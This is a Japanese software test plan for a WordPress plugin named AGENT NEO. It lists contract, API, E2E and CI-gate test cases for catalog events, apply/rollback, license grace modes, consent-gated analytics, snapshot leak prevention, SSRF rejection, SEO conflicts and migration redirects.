# L3 テスト計画（SSOT）

本書は `docs/design/L3-detailed-design.md` の §5「テスト設計」を分離して SSOT 化したものです。  
`L3-detailed-design.md` では本章へのリンク先としてのみ参照されます。

## 1. 対象 / 参照

- 対象: `REQ-F-001` 〜 `REQ-F-042`、`REQ-NF-001` 〜 `REQ-NF-037` の L3 受入範囲
- 正本参照:
  - `docs/design/api-catalog.md`
  - `docs/design/L2-design.md` §8.9
  - `docs/api/openapi.yaml`
  - `automation SEO D-PLUGIN-CONTRACT §17`（`catalog-update`）

## 2. テスト戦略

### 2.1 テスト戦略表

| レベル | 対象 | ツール | カバレッジ目標 |
|---|---|---|---|
| Unit | 差分生成、idempotency/キー正規化、schema validate、gating helpers | PHPUnit | 主要ロジック 80% |
| Integration | REST 送受信、option/meta/CPT、ジョブ遷移、outbox/retry 遷移 | PHPUnit + wp-cli | 主要経路 100% |
| E2E | dry-run→apply→rollback、preview→apply、catalog-update 受信一連 | Playwright（管理画面） | P0 シナリオ 100% |
| Contract | API / Schema / セキュリティ / 外部連携 | PHPUnit + custom harness | 契約 endpoint 100% |
| Static/Lint | ThemeCheck / PHPCS-WPCS / axe / Lighthouse / a11y / RTL lint | CI（Theme Check / PHPCS / axe / Lighthouse） | P0 を全件通過 |

### 2.2 テストピラミッド（方針）

- Unit: 45%
- Integration: 30%
- E2E: 15%
- Contract/Security/Static 合算: 10%

統合テスト失敗時は Unit → Integration → E2E の順で早期に原因切り分けし、E2E は `apply/rollback` などの状態遷移を集中検証する。

### 2.3 品質ゲート（共通）

- a11y: `axe` / `WCAG2.2 AA`（fail on violations）
- i18n/RTL: `i18n-profile` 準拠（textdomain / RTL 崩れ）
- 性能: `LCP <= 2.5s`, `INP <= 200ms`, `CLS <= 0.1`
- バンドル: 初期 CSS `<=20KB`, 初期 JS `<=70KB`（gzip）
- 外部資産: render-blocking `3rd party = 0`

## 3. カテゴリ別テスト観点

### 3.1 Contract テスト（catalog-update, automation SEO §17 準拠）

| TestID | endpoint | 種別 | 優先度 | 受入観点 |
|---|---|---|---|---|
| CAT-001 | catalog-update | Contract | P0 | `event_kind=block_registered` で `received=true` / `event_id` / `deduplicated=false` / `next_action=none`（4フィールドのみ、§17.11） |
| CAT-002 | catalog-update | Contract | P0 | `event_kind=block_unregistered` で `received=true` / `event_id` / `deduplicated=false` / `next_action=none`（4フィールドのみ、§17.11） |
| CAT-003 | catalog-update | Contract | P0 | `event_kind=template_updated` で `received=true` / `event_id` / `deduplicated=false` / `next_action=none`（4フィールドのみ、§17.11） |
| CAT-004 | catalog-update | Contract | P0 | `event_kind=theme_token_updated` で `received=true` / `event_id` / `deduplicated=false` / `next_action=none`（4フィールドのみ、§17.11） |
| CAT-005 | catalog-update | Contract | P0 | 同一 `event_id` 再送時 `received=true` / `event_id` / `deduplicated=true` / `next_action=none`（4フィールドのみ、§17.11） |
| CAT-006 | catalog-update | Contract | P0 | `event_kind` 欠落時に `400 VALIDATION_ERROR` |
| CAT-007 | catalog-update | Contract | P0 | `5xx` / `429` / `timeout` 応答時、再試行間隔が初回 `1s`、指数 `2^n`、最大5回、各回 ±10% jitter |
| CAT-008 | catalog-update | Contract | P0 | 未インストール時に `409 AGENT_NEO_NOT_INSTALLED` |
| CAT-009 | catalog-update | Contract | P1 | `400`/`401`/`409` 受信時は再試行なし（ただし `429 RATE_LIMITED` は再試行対象） |

※ CAT-001〜005 の4フィールド仕様は DC-F-001、CAT-007〜009 の再試行定義は DC-F-002、かつ §17.11（CARRY-G2-006 含む）準拠。

### 3.2 API/状態遷移テスト

| TC | endpoint / 機能 | 種別 | 優先度 | 受入観点 |
|---|---|---|---|---|
| TC-001 | `/actions/dry-run` | API | P1 | patch block の dry-run 成功で `diff_hash` を返却 |
| TC-002 | `/actions/apply`（正常） | API | P0 | dry-run 直後に apply 成功し rollback_point を保存 |
| TC-003 | `/actions/apply`（異常） | API | P0 | `diff_hash` 不一致時 `412` で拒否 |
| TC-004 | `/actions/apply`（冪等） | API | P1 | 同一 `diff_hash` 再送で no-op（副作用なし） |
| TC-005 | `/pages/{id}/apply` | API | P0 | 2シナリオ: ①`preview` 昇格経路(CARRY-016)では `from_preview_token` 未指定時に `403` 相当で拒否、②通常 apply（非 preview）では `from_preview_token` なしでも正常完了 |
| TC-006 | `/pages/{id}/rollback` | API | P0 | rollback_point 不在時 `410`、既存履歴の復元成功 |
| TC-007 | `/posts/{id}/blocks/{block_id}` | API | P0 | PATCH idempotency key 未再送時のみ更新を実行 |
| TC-008 | `/posts/{id}/sections/{section_id}/edit` | API | P1 | 参照のみの section 変更で他 section 不変 |
| TC-009 | `/tracking/event` | API | P0 | 必須項目未送付時 `400` |
| TC-010 | `/tracking/event` | Security | P0 | 署名不正/nonce 不正時 `401` |
| TC-011 | `/license/validate` および `/pages/{id}/apply` | API | P0 | 2モード受入条件（TB-18a / deny-first）: ①**invalid/失効モード（即時deny）**: ライセンスキーが無効・失効の場合、`/license/validate` が `readonly=true` を返し、法人機能 write endpoint（apply 等）が即時 `403 FEATURE_DISABLED` で拒否され個人版 CRUD のみ通過すること。②**transient モード（grace 中）**: ライセンスサーバ 502 / 3 回連続失敗の場合、48h grace 中は readonly 縮退を維持し write 系 endpoint が `503 LICENSE_GRACE_PERIOD` を返すこと（readonly GET は継続通過）。grace 満了後は `403 FEATURE_DISABLED` で個人版縮退に移行すること。invalid（確定的失効→即時 403）と transient（サーバ障害→grace 中 503→grace 満了後 403）は別モードとして区別して P0 検証すること |
| TC-012 | `/license/validate` | API | P1 | Fallback が既存テーマに安全に適用される |
| TC-013 | `/tracking/context` | API | P1 | plugin 署名整合、`tracking/context` 受信スキーマ照合 |
| TC-014 | SEO coexistence | Function | P1 | 重複 meta / JSON-LD 検出時に warning を必須化 |
| TC-015 | SEO coexistence | E2E | P1 | 既存テーマ互換で既定メタ/構造化データの二重挿入を検知 |
| TC-016 | a11y gate | Gate | P0 | axe でWCAG2.2 AA 以上、失敗があるとCI fail |
| TC-017a | i18n/RTL gate | Gate | P1 | RTL/i18n 違反があると CI fail |
| TC-017b | sanitize_slug / sanitize_title 分離 | Unit | P1 | ①`sanitize_slug()` が非ASCII入力（例: "SEO 基礎"・"日本語のみ"）を `[a-z0-9-]` 内部 slug へ正規化することを単体テストで検証する（全非ASCII入力はフォールバックで UUID 短縮形を返すこと、R-09a / CARRY-G2-009 準拠）。②`sanitize_title()` はWP標準の表示用関数であり `[a-z0-9-]` を保証しないため、その戻り値を `section_id`・`cta_id` の DB カラム・API route パラメータ・WP ブロック属性・CSS セレクタへ直接使わないことを確認する（CARRY-G2-013 準拠）。すなわち「内部ID = `sanitize_slug()` 出力」「`sanitize_title()` は表示用（ログ・管理画面ラベル）であり `section_id` には不使用」の分離を単体テストで証明すること |
| TC-018 | Performance gate | Gate | P1 | LCP/INP/CLS、初期CSS/JS、render-blocking を超過すると CI fail |
| TC-019 | apply/rollback フロー | E2E | P0 | dry-run → apply → rollback 正常系、監査ログと状態更新が一致 |
| TC-020 | apply/rollback 異常系 | E2E | P0 | rollback 失敗時に差し戻し済み状態を破綻させず、再試行可能 |
| TC-021 | diff_hash 整合性 | API | P0 | dry-run/apply で同一 `diff_hash` 必須、変更内容と差分が一致 |
| TC-022 | SEO 共存（外部/内部） | Security | P2 | 重複/競合検知で apply を中断し、警告レベルに集約 |
| TC-023a | SSRF | Security | P0 | 初回検証時に private/loopback/link-local/metadata アクセスを拒否し、redirect は追従しない |
| TC-023b | SSRF | Security | P0 | 再試行時に URL を再解決し、再解決先が private/loopback/link-local/metadata であれば再拒否 |
| TC-024 | once-token replay | Security | P0 | once-token replay が atomic INSERT で再送除外 |
| TC-025 | slug / selector 安全性 | Security | P1 | 非ASCII入力を `sanitize_slug()` が `[a-z0-9-]` へ正規化し、CSSセレクタ / ブロック属性に非ASCII slug を出力しないことを単体テストで検証（ログ化のみでの合格は不可） |
| TC-026 | public snapshot | Security | P1 | `public snapshot` が内部 ID を返さない（公開ID変換のみ） |
| TC-027 | SBOM gate | Security | P1 | `sbom.cdx.json` が release build で生成され、依存元 / ライセンス / checksum 検証が PASS し、Theme Review 提出前に artifact が確定していること |
| TC-028 | Lighthouse CI render-blocking / consent | Gate | P1 | Lighthouse CI で render-blocking third-party = 0 を検証し、consent 前後のタグ発火タイムラインを確認する。同意後 `document.createElement('script')` による動的注入は FCP 前 parser-blocking に該当しないため、GA4/GTM consent mode v2 準拠と合わせて検証する |
| TC-029 | lp-blueprint セクション整合 | Contract | P1 | `lp-blueprint` のセクション定義が `api-catalog` および L2 設計と一致すること（12セクション整合確認） |
| TC-030 | bridge-profile safe_apply_state | API | P1 | 既存テーマ環境で `GET /automation-seo/bridge-profile` が `safe_apply_state=preview-only` を返却し、write 系 endpoint 呼び出しが拒否されること（ADR-019 準拠） |

## 4. P0 / P1 / P2 分類

- P0: CAT-001〜CAT-008、TC-002、TC-003、TC-005、TC-006、TC-007、TC-009、TC-010、TC-011、TC-016、TC-019、TC-020、TC-021、TC-023a、TC-023b、TC-024、TC-042、TC-043、TC-045、TC-047、TC-048、TC-049、TC-050、TC-067
- P1: CAT-009、TC-001、TC-004、TC-008、TC-012、TC-013、TC-014、TC-015、TC-017a、TC-017b、TC-018、TC-025、TC-026、TC-027、TC-028、TC-029、TC-030、TC-031、TC-032、TC-033、TC-034、TC-035、TC-037、TC-038、TC-040、TC-044、TC-046、TC-051、TC-052、TC-053、TC-054、TC-055、TC-056、TC-057、TC-058、TC-059、TC-060、TC-061、TC-062、TC-063、TC-064、TC-066、TC-068、TC-069、TC-070、TC-072、TC-073、TC-074、TC-075、TC-076、TC-077、TC-078、TC-079
- P2: TC-022（監査ログ整合と運用連携）、TC-036（SLO レポート）、TC-039（AI citation log）、TC-041（LLMO 計測サマリ）、TC-065（disclosure 非注入時デフォルト動作）、TC-071（prefers-reduced-motion）

※ 優先度整合・受入条件は INT-002 / DC-F-002 に基づき `§4` 一覧を `TC` テーブルに合わせて更新済み（CAT-009 は P1）。TC-017 を TC-017a/TC-017b に分割。TC-027〜TC-030 を P1 で追加。§8 追加分 P0（TC-042/043/045/047/048/049/050）を §4 正本リストに反映済み（2026-06-18）。§8 追加分（TC-031〜060）を P0/P1/P2 とも §4 正本に反映済み（2026-06-18）。

## 5. L4 carry（007/009/011/012/013/015/017/021/025/026/028）検証観点（設計解決済みL4検証: 006/014）

本項目は L4 実装で満たすべき受入テストを明記する。

| carry-id | 検証観点（L4） | TC 参照 | 根拠 |
|---|---|---|---|
| 006 | AGENT-NEO producer の catalog-update 再送が initial_backoff=1s・指数 2^n・最大5回・429含む retry に従うことを単体テストで検証する | CAT-007 | `docs/design/api-catalog.md` §17.11 |
| 007 | once-token replay の atomic INSERT と重複排除 | TC-024 | `docs/reviews/G2-carry-register.md` |
| 009 | slug / selector の非ASCII耐性（`sanitize_slug()` が `[a-z0-9-]` へ正規化し、CSSセレクタ / ブロック属性への非ASCII出力がないことを単体テストで検証） | TC-025 | `docs/security/threat-model.md` |
| 011 | Lighthouse CI で render-blocking third-party = 0 を検証し、consent 前後のタグ発火タイムラインを確認する | TC-028 | `docs/design/L2-design.md` §8.9 |
| 012 | `lp-blueprint` のセクション定義が `api-catalog` と L2 で一致（12セクション整合） | TC-029 | `docs/design/api-catalog.md` |
| 013 | i18n/RTL 違反時の CI fail（TC-017a）、`sanitize_slug()` による非ASCII入力の `[a-z0-9-]` 正規化、および `sanitize_title()` 戻り値を `section_id` に直接使わない分離（TC-017b / R-09a / CARRY-G2-009 / CARRY-G2-013） | TC-017b | `docs/design/data-model-ids.md` §R-09a |
| 014 | 2モード検証（TB-18a 準拠 / TC-011 参照）: ①**invalid/失効モード**: ライセンスキーが無効・失効の場合、`/license/validate` が `readonly=true` を返し、法人機能 write endpoint が即時 `403 FEATURE_DISABLED` で拒否され個人版 CRUD のみ通過すること。②**transient モード**: ライセンスサーバ 502 / 3 回連続失敗の場合、48h grace 中は readonly 縮退を維持し write 系 endpoint が `503 LICENSE_GRACE_PERIOD` を返すこと（readonly GET は継続通過）。grace 満了後は `403 FEATURE_DISABLED` で個人版縮退に移行すること。invalid（確定的失効→即時 403）と transient（サーバ障害→grace 中 503→grace 満了後 403）は別モードとして区別して単体テストで P0 検証すること | TC-011 | `docs/design/L2-design.md` |
| 015 | SBOM gate（release build 時に `sbom.cdx.json` 作成）で依存元 / ライセンス / checksum 検証が PASS し、Theme Review 提出前に artifact を確定する | TC-027 | `docs/design/L2-design.md` |
| 017 | URL バリデーション（SSRF）、リダイレクト拒否、初回 private/loopback/link-local/metadata 判定 | TC-023a | `docs/security/threat-model.md` |
| 021 | 既存テーマで `GET /automation-seo/bridge-profile` が `safe_apply_state=preview-only` を返却し、write 系 endpoint 呼び出しが拒否される（ADR-019 準拠） | TC-030 | `docs/design/api-catalog.md` |
| 025 | 送信再試行時の re-resolve + private 判定（再解決先が private/loopback/link-local/metadata なら再拒否） | TC-023b | `docs/design/api-catalog.md` |
| 026 | public snapshot に内部 ID を漏らさない（公開 ID 変換のみ） | TC-026 | `docs/design/L2-design.md` |
| 028 | 既存テーマ write 例外条件・preview-only enforcement（既存テーマ環境で write 系 endpoint が拒否され、`safe_apply_state=preview-only` が返却されること） | TC-030 | `docs/design/L3-WBS.md`（T-010 / .2） |

## 6. 受入時チェックリスト

- すべての P0 が完了していること
- Contract テストで CAT-001〜CAT-009 が green
- a11y / i18n / perf の 3 ゲートが green
- `diff_hash` / `event_id` / `once-token` に関する整合不具合が残存しないこと
- `apply/rollback` の正常・異常・冪等性が検証済みであること

---

## 8. 2026-06-18 追加（実テーマギャップ監査由来 / GAP-RT-036〜041）

> 本節は `docs/reviews/L3-real-theme-gap-register.md` の GAP-RT-036〜041 により判明した「受入条件はあるが独立 TC が存在しない」ギャップを埋める TC 群です。  
> 既存 TC の最大採番 TC-030 に続き、TC-031〜TC-060 として連番付与しています。  
> 各 TC の対象要件・前提・手順・期待結果・分類（unit / integration / E2E / CI gate）・優先度（P0〜P3）を記載します。

---

### 8.1 GAP-RT-036: 運用品質（ACC-NF-007 / REQ-NF-013）— 独立 TC 群

**背景**: ACC-NF-007 は REQ-NF-013（運用品質: WP/PHP 互換・更新前後チェック・rollback・plugin 衝突検出・可用性 fallback・SLO/health check を契約化する）の受入条件だが、個別の TC が存在しなかった。

| TC | 対象要件 | 前提 | 手順 | 期待結果 | 分類 | 優先度 |
|---|---|---|---|---|---|---|
| TC-031 | ACC-NF-007 / REQ-NF-013 | WP 6.6+ + PHP 8.1+ + AGENT NEO 有効化済み環境 | (1) WP コアをマイナーバージョンアップ (2) `GET /agent-neo/v1/status` でヘルスチェックエンドポイントを呼ぶ (3) `wp agent-neo health-check` CLI コマンドを実行 | (a) `status: healthy` が返り fatal error なし (b) CLI が compatibility matrix の検証結果を JSON で出力し、PASS / WARN / FAIL が判定される | integration | P1 |
| TC-032 | ACC-NF-007 / REQ-NF-013 | PHP 8.2 で AGENT NEO を動作させられるテスト環境 | (1) PHP バージョンを 8.1→8.2 へ切り替え (2) AGENT NEO の全主要クラスをインスタンス化 (3) PHPCS + PHPCompatibilityWP を実行 | (a) deprecated dynamic properties 警告ゼロ (b) PHPCompatibilityWP CI チェックが PASS (c) 管理画面・フロント両方でエラーなく動作する | CI gate | P1 |
| TC-033 | ACC-NF-007 / REQ-NF-013 | AGENT NEO 有効化環境に互換テスト用ダミープラグインを追加 | (1) Yoast SEO / Contact Form 7 / WP Rocket の 3 プラグインを有効化 (2) `wp agent-neo conflict-scan` CLI を実行 (3) 管理画面「プラグイン競合」パネルを確認 | (a) 各プラグインとの衝突検出結果（conflict_severity: none / low / medium / high）が JSON で返る (b) 高衝突（high）が検出された場合、管理画面に admin_notice が表示される | integration | P1 |
| TC-034 | ACC-NF-007 / REQ-NF-013 | AGENT NEO 有効化環境 | (1) テーマアップデート前に `wp agent-neo update-preflight` を実行 (2) アップデートを適用 (3) `wp agent-neo update-postflight` を実行 | (a) preflight が DB スキーマ・設定値・rollback_point を記録し JSON で出力 (b) アップデート後に postflight が事前記録と差分 0 を確認 (c) 差分ありの場合、rollback_point から設定値を復元できる | integration | P1 |
| TC-035 | ACC-NF-007 / REQ-NF-013 | WP-Cron が有効な環境 | (1) WP-Cron の scheduled events を確認 (`wp cron event list`) (2) AGENT NEO が登録した定期ジョブ（health-check / catalog-sync 等）が一覧に存在することを確認 (3) `wp cron event run agent_neo_health_check` でジョブを強制実行 | (a) ジョブが正常に実行され、ログに `cron_run: success` が記録される (b) 実行失敗（外部依存エラー）時は DLQ エントリが生成され管理画面に警告が表示される | integration | P1 |
| TC-036 | ACC-NF-007 / REQ-NF-013 | `GET /agent-neo/v1/status` エンドポイントが実装済み | (1) 外部監視ツール（UptimeRobot 等）が 1 分間隔でエンドポイントをポーリングする状況をシミュレート (2) DB 接続を意図的に切断（テスト環境） (3) エンドポイントのレスポンスを確認 | (a) DB 切断時も `status: degraded` または `status: unavailable` を JSON で返し 500 を返さない (b) SLO 目標（稼働率 99.5%）に対するレポートが CLI で出力できる | integration | P2 |

---

### 8.2 GAP-RT-037: LLMO — AI クローラビリティ・構造化データ品質（ACC-NF-011 / REQ-NF-017）

**背景**: ACC-NF-011 は REQ-NF-017（LLMO/AI 検索最適化: answer unit・evidence graph・content origin・AI visibility policy・citation anchor・LLMO 計測・claim risk を契約化する）の受入条件だが、個別の TC が存在しなかった。

| TC | 対象要件 | 前提 | 手順 | 期待結果 | 分類 | 優先度 |
|---|---|---|---|---|---|---|
| TC-037 | ACC-NF-011 / REQ-NF-017 | AGENT NEO Core Plugin 有効化・記事が 1 件以上公開済み | (1) answer unit が定義された記事（H2 + 短回答 + 根拠リンク + CTA を持つセクション）を作成 (2) `GET /agent-neo/v1/posts/{id}/markdown` を呼ぶ | (a) レスポンスに `answer_units` 配列が含まれ、各要素が `question / short_answer / details / evidence_refs / updated_at / cta_id` フィールドを持つ (b) 空の H2 セクションは answer unit として出力されない | integration | P1 |
| TC-038 | ACC-NF-011 / REQ-NF-017 | Robots.txt / X-Robots-Tag が設定済みの記事環境 | (1) `GET /agent-neo/v1/ai-crawlers/access-matrix` を呼ぶ | (a) Googlebot / GPTBot / ClaudeBot / PerplexityBot 等の主要 AI クローラ別に `allowed / blocked / noindex` 状態が列挙された JSON が返る (b) クローラプリセット切替（`agent_neo_ai_crawler_preset: permissive / balanced / restrictive`）を設定変更後に再取得すると値が変わる | integration | P1 |
| TC-039 | ACC-NF-011 / REQ-NF-017 | GA4 または custom tracking endpoint が設定済み | (1) `<link rel="me">` または `data-agent-citation-anchor` 属性付きコンテンツを含む記事ページを表示 (2) AI クローラ UA（例: GPTBot）でページを GET | (a) レスポンスヘッダに `X-Agent-Citation-Policy` が含まれる (b) フロント HTML の主要コンテンツに `data-agent-citation-anchor` が付与されている (c) AI クローラからのアクセスログが `ai_crawler_log` テーブルに記録される | integration | P2 |
| TC-040 | ACC-NF-011 / REQ-NF-017 | Entity Graph が設定された記事（§ L3-A3 entity-graph.schema.json） | (1) 記事を公開 (2) `GET /agent-neo/v1/posts/{id}/snapshot` でスナップショットを取得 | (a) レスポンスに `entity_graph` フィールドが含まれ、`@graph` 内に Article / Person / Organization の少なくとも 2 ノードが存在する (b) `evidence_graph` が claim / source / reviewer / verified_date フィールドを持つ | integration | P1 |
| TC-041 | ACC-NF-011 / REQ-NF-017 | LLMO 計測イベントが tracking/event に統合済み | (1) AI クローラからページにアクセスして tracking event を発火させる (2) `GET /agent-neo/v1/tracking/llmo-summary` でサマリを取得 | (a) `ai_impressions / ai_citations / ai_referral_clicks` の 3 指標が 24 時間集計で返る (b) AI referral（Perplexity / Claude 等経由の訪問）が UA 解析で分類され、通常訪問と区別してカウントされる | integration | P2 |

---

### 8.3 GAP-RT-038: Consent Gate（Cookie 同意前後のスクリプト発火タイムライン）

**背景**: TC-028 は Lighthouse render-blocking に特化した TC だが、「同意バナー表示 → 第三者タグ / GA4 の非発火 → 同意付与 → 発火」のタイムライン検証 TC が独立して存在しなかった。REQ-NF-004（データ保護）・REQ-NF-009（外部送信同意）・L3-A4（`third-party-tags.schema.json` / Consent Mode v2）に基づく。

| TC | 対象要件 | 前提 | 手順 | 期待結果 | 分類 | 優先度 |
|---|---|---|---|---|---|---|
| TC-042 | REQ-NF-004 / REQ-NF-009 | GA4 タグが `async_after_consent` / `consentRequired: ["analytics_storage"]` で設定済み・同意バナーあり・Consent Mode v2 設定済み（`defaultConsentState` が全 `denied`） | (1) プライベートブラウジングで記事ページを開く（Cookie なし状態） (2) DevTools Network パネルを監視 (3) 同意バナーが表示された状態のまま 5 秒待機 | (a) **analytics/ads の計測 ping**（`google-analytics.com/g/collect` 等の collect エンドポイント）へのリクエストが 0 件 (b) **GTM コンテナ本体（`googletagmanager.com/gtm.js` 等）のロードが発生しない** (c) 注意: Consent Mode v2 の `gtag('consent','default',{...denied})` 初期化スニペット自体は `<head>` で呼ばれることが正常仕様であり、本 TC の非発火対象に含まない（TC-044 で独立検証する） | E2E | P0 |
| TC-043 | REQ-NF-004 / REQ-NF-009 | TC-042 に続けて実施 | (1) 同意バナーで「すべて受け入れる」を押す (2) DevTools Network を確認 | (a) 同意 click から 1 秒以内に GA4 ping リクエストが送信される (b) `gtag('consent', 'update', { analytics_storage: 'granted' })` が実行されたことが Console log で確認できる (c) GA4 タグの読み込みが `async`（parser-blocking でない）で完了する | E2E | P0 |
| TC-044 | REQ-NF-009 / L3-A4 §third-party-tags | Consent Mode v2 設定済み（`defaultConsentState` が全 `denied`） | (1) ページロード直後に `window.dataLayer` の内容を確認 | (a) `gtag('consent', 'default', { analytics_storage: 'denied', ad_storage: 'denied', ad_user_data: 'denied', ad_personalization: 'denied' })` が `<head>` 最上位で呼ばれている | unit / E2E | P1 |
| TC-045 | REQ-NF-009 / L3-A4 §third-party-tags | `advertising` カテゴリのタグが設定済み | (1) 同意なし状態でページを表示 (2) `advertising` タグの HTML 出力を確認 | (a) `advertising` カテゴリのタグ HTML が `<head>` / `<body>` に出力されていない (b) Playwright でタグ要素の存在を確認 → 0 件 | E2E | P0 |
| TC-046 | REQ-NF-009 / L3-A4 §third-party-tags | Playwright E2E 環境 + DevTools Protocol 利用可能 | (1) 同意バナー表示→選択「拒否」ルートを Playwright でシミュレート | (a) 拒否選択後も GA4 ネットワークリクエストが発生しない (b) 拒否フラグが Cookie に保存され、再訪問時も同意バナーが再表示されない | E2E | P1 |

---

### 8.4 GAP-RT-039: 公開 Snapshot Allowlist（draft/private 記事・機密データ漏洩防止）

**背景**: TC-026 は「public snapshot が内部 ID を返さない」を検証するが、draft/private 記事・WP nonce・ライセンスキー等の機密情報が snapshot や crawl-map に含まれないことを確認する独立 TC が存在しなかった。REQ-NF-004（データ保護）・REQ-NF-015（AI 運用性/クローラビリティ）に基づく。

> **【軸分離注記】本節（TC-047〜051）は snapshot の情報漏洩（draft/private 記事・nonce・ライセンスキーの公開エンドポイントへの漏洩）を検証するセキュリティテストです。視覚回帰テスト（スタイル差分の承認フロー / BackstopJS による pixel 比較 / ADR-021 PoC）とは別軸であり、本 TC 群で視覚回帰カバレッジが担保されるわけではありません。視覚回帰は MG-009 系 carry および ADR-021 PoC として別途 L4〜L5 carry で追跡されます。**

| TC | 対象要件 | 前提 | 手順 | 期待結果 | 分類 | 優先度 |
|---|---|---|---|---|---|---|
| TC-047 | REQ-NF-004 / REQ-NF-015 | draft ステータスの記事が 1 件以上存在する | (1) 未認証 HTTP GET で `GET /agent-neo/v1/public/pages/snapshot` を呼ぶ | (a) draft / private ステータスの記事 ID・スラッグ・コンテンツがレスポンスに含まれない (b) レスポンスの `allowed_posts` が published かつ snapshot_allowed=true の記事のみを含む | integration | P0 |
| TC-048 | REQ-NF-004 / REQ-NF-015 | public crawl-map エンドポイントが実装済み | (1) 未認証で `GET /agent-neo/v1/public/crawl-map` を呼ぶ | (a) draft / private / password-protected 記事の URL がリストに含まれない (b) `noindex=true` の記事 URL もリストから除外されている | integration | P0 |
| TC-049 | REQ-NF-004 / REQ-NF-015 | `GET /agent-neo/v1/public/pages/{id}/snapshot` が実装済み | (1) 有効な WP nonce を HTML 内に持つページの snapshot を未認証で取得 | (a) レスポンス HTML / JSON に `_wpnonce` 文字列が含まれない (b) `nonce` キーを持つフィールドが snapshot レスポンスのどの階層にも存在しない | integration | P0 |
| TC-050 | REQ-NF-004 / REQ-NF-002 | ライセンスキーが `wp_options` に保存済み | (1) 未認証で `/agent-neo/v1/public/` 配下の全公開エンドポイントに GET を送る (2) 認証済み管理者で `/agent-neo/v1/settings/` を GET する | (a) 公開エンドポイントのどのレスポンスにも `license_key` / `api_key` フィールドが含まれない (b) 認証済み管理者の `/settings/` レスポンスでもライセンスキーが平文で返らない（マスク済み：例 `sk-xxxx...xxxx`） | integration | P0 |
| TC-051 | REQ-NF-015 | snapshot allowlist 設定が管理画面で変更可能な環境 | (1) 管理画面で特定の記事を `snapshot_allowed=false` に設定 (2) `GET /agent-neo/v1/public/pages/{id}/snapshot` を未認証で呼ぶ | (a) `403 Forbidden` または `404 Not Found` が返る (b) 対象記事のコンテンツがレスポンスに一切含まれない | integration | P1 |

---

### 8.5 GAP-RT-040: Canonical + OGP の同時評価（同時 toggle 禁止・二重出力排除）

**背景**: TC-014/TC-015 は SEO 競合検知（重複 meta / JSON-LD）に特化しているが、「同一ページで canonical URL と `og:url` が整合する」「既存 SEO プラグインとの共存時に OGP が二重出力されない」「noindex が robots と sitemap に同時反映される」という複合検証 TC が独立して存在しなかった。REQ-F-011（SEO Core）・REQ-NF-018（SEO/WP 運用ハザード管理）に基づく。

| TC | 対象要件 | 前提 | 手順 | 期待結果 | 分類 | 優先度 |
|---|---|---|---|---|---|---|
| TC-052 | REQ-F-011 / REQ-NF-018 | SEO プラグインなし環境で記事が公開済み | (1) 記事の SEO メタで canonical を `https://example.com/post-a/` に設定 (2) 記事ページの HTML ソースを確認 | (a) `<link rel="canonical" href="https://example.com/post-a/">` が 1 件のみ出力される (b) `<meta property="og:url" content="https://example.com/post-a/">` が canonical と同一 URL で出力される (c) canonical と og:url が異なる場合は管理画面に warning が表示される | integration | P1 |
| TC-053 | REQ-F-011 / REQ-NF-018 | Yoast SEO が有効化されている環境 | (1) Yoast SEO が有効な状態で記事ページを表示 (2) HTML ソースの `<head>` を確認 | (a) `<meta property="og:*">` が 2 セット出力されない（Yoast または AGENT NEO のどちらか一方のみ） (b) AGENT NEO の `SeoConflictDetector` が canonical / robots は AGENT NEO 優先、OGP は Yoast 優先として出力を制御している | integration | P1 |
| TC-054 | REQ-F-011 / REQ-NF-018 | AGENT NEO SEO 設定で特定ページを noindex に設定 | (1) 記事の SEO メタで `robots.index=false` を設定 (2) ページの HTML ソース・sitemap.xml・robots.txt を確認 | (a) `<meta name="robots" content="noindex,follow">` が出力される (b) XML sitemap からその URL が除外されている（単純 toggle ではなく両方に同時反映） (c) robots.txt に個別ルールが不要（sitemap 除外で十分に機能する） | integration | P1 |
| TC-055 | REQ-F-011 / REQ-NF-018 | JSON-LD が有効な環境 | (1) 記事に Article + FAQPage + BreadcrumbList の 3 ノードを持つ @graph を設定 (2) ページの `<script type="application/ld+json">` を検証 | (a) `<script type="application/ld+json">` が 1 件のみ出力される（@graph 統合、複数の個別 script タグに分割されない） (b) `@graph` 配列に重複 `@type` ノードが存在しない | integration | P1 |

---

### 8.6 GAP-RT-041: 移行 SEO（URL マッピング / redirect / canonical / 画像 diff）

**背景**: ACC-008 は「移行プレビューと投入結果が一致する」を検証するが、「旧テーマ→AGENT NEO 移行時の 301 リダイレクト保持・canonical 整合・パーマリンク変化・画像差分レポート」の独立 TC が存在しなかった。REQ-F-008（移行プラグイン）・REQ-NF-018（SEO ハザード管理）に基づく。

| TC | 対象要件 | 前提 | 手順 | 期待結果 | 分類 | 優先度 |
|---|---|---|---|---|---|---|
| TC-056 | REQ-F-008 / REQ-NF-018 | 移行元の旧テーマサイト（WP REST アクセス可）と移行先 AGENT NEO 環境が準備済み | (1) 移行プラグインで旧テーマから投稿 10 件を抽出 (2) URL マッピングファイル（旧 URL → 新 URL）を生成 | (a) URL マッピングが JSON / CSV 形式で出力される (b) 旧パーマリンクと新パーマリンクが全 10 件分マップされ、漏れゼロ | integration | P1 |
| TC-057 | REQ-F-008 / REQ-NF-018 | TC-056 の URL マッピングが生成済み | (1) `wp agent-neo migration redirect-setup --mapping=mapping.json` を実行 (2) 旧 URL にアクセス | (a) HTTP 301 レスポンスが返り、`Location` ヘッダに新 URL が設定されている (b) 全 10 件の旧 URL で 301 が確認できる (c) 301 チェーン（301→301 の連鎖）が発生していない | integration | P1 |
| TC-058 | REQ-F-008 / REQ-NF-018 | 移行後に canonical が設定済み | (1) 移行後の記事ページの HTML ソースを確認 (2) 移行元 URL での canonical 設定と比較 | (a) 移行後の `<link rel="canonical">` が新 AGENT NEO パーマリンクを指している (b) 旧テーマの canonical を引き継ぐ場合は `seo-meta.schema.json` の `canonical.source=manual` で明示的に指定されている | integration | P1 |
| TC-059 | REQ-F-008 / REQ-NF-018 | 移行元サイトに画像付き記事が 5 件以上存在 | (1) `wp agent-neo migration diff-images --post_ids=1,2,3,4,5` を実行 | (a) 移行前後の画像 URL 差分レポートが出力される (b) 移行後に media_id が再割り当てされた場合、旧 img src と新 img src のマッピングが diff に含まれる (c) 消失した画像（旧にあり新にない）が `missing_images` リストに列挙される | integration | P1 |
